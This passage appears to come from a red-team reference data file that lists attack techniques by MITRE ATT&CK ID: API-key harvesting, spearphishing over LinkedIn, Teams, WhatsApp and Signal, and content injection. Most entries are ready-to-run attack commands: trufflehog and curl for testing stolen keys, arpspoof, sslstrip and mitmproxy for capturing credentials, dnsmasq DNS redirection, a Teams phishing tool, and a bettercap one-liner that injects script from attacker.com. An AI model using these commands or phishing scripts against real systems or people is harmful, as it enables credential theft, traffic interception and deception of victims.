        "API key leak exploitation:\n$ trufflehog github --org=target-org --only-verified\n$ grep -r 'api.target.com\\|x-api-key\\|Authorization' /tmp/js_files/\n# Scan extracted JS files for embedded API keys\n# Test found keys: curl -H 'X-API-Key: FOUND_KEY' https://api.target.com/admin\n# Rotate to admin endpoints: /admin, /internal, /debug, /v2"
      ]
    },
    {
      name: "Phishing - Spearphishing via Service",
      id: "T1566.003",
      summary: "LinkedIn • Teams • WhatsApp • social media spearphish",
      description: "Send targeted phishing messages via third-party services and social media platforms",
      tags: ["LinkedIn phish", "Teams phish", "social media", "T1566"],
      steps: [
        "LinkedIn spearphishing with fake job offer:\n# Create convincing recruiter persona\n# Connect with target employees\n# Send job offer with malicious document or link\n# 'Please review attached job description'",
        "Microsoft Teams external phishing:\n$ python3 teamphisher.py -u user@attacker.com -p password -t victim@target.com -m 'Please review attached document'\n# Teams allows external messaging by default\n# Messages from external accounts still appear in Teams client",
        "WhatsApp Business API phishing:\n# Register legitimate WhatsApp Business account\n# Send targeted messages with malicious links\n# Higher trust than email for some targets",
        "Twitter/X DM phishing:\n# Create fake persona, engage target in conversation\n# Send DM with malicious link disguised as resource\n# Especially effective for researchers, journalists",
        "Signal / Telegram phishing:\n# Create account resembling trusted contact\n# Send malicious file disguised as document\n# Encrypted messaging apps bypass email gateway"
      ]
    },
    {
      name: "Content Injection",
      id: "T1659",
      summary: "AiTM • BGP hijack • MITM • malicious ad injection",
      description: "Inject malicious content into legitimate web traffic through adversary-in-the-middle positioning",
      tags: ["AiTM", "BGP hijack", "MITM", "T1659"],
      steps: [
        "ARP poisoning for LAN MITM:\n$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1\n$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100\n# Intercept traffic between target and gateway",
        "HTTPS interception with SSLstrip+:\n$ mitmproxy --mode transparent --ssl-insecure -p 8080\n$ sslstrip -l 8080\n# Downgrade HTTPS to HTTP, capture credentials",
        "DNS injection at router level:\n# Compromise router, modify DNS to attacker-controlled server\n# Serve malicious DNS responses for target domains\n$ dnsmasq --listen-address=0.0.0.0 --address=/target.com/192.168.1.1\n# Redirect all traffic to attacker infrastructure",
        "BGP hijacking (nation-state level):\n# Announce more specific route for target's IP block\n# Traffic routes through attacker AS\n# Requires BGP peering with upstream providers",
        "Inject malicious JavaScript into HTTP traffic:\n$ bettercap -eval \"set arp.spoof.targets 192.168.1.100; arp.spoof on; set js.rewrite.script 'http://attacker.com/inject.js'; js.rewrite on\""
      ]
    }
  ]
};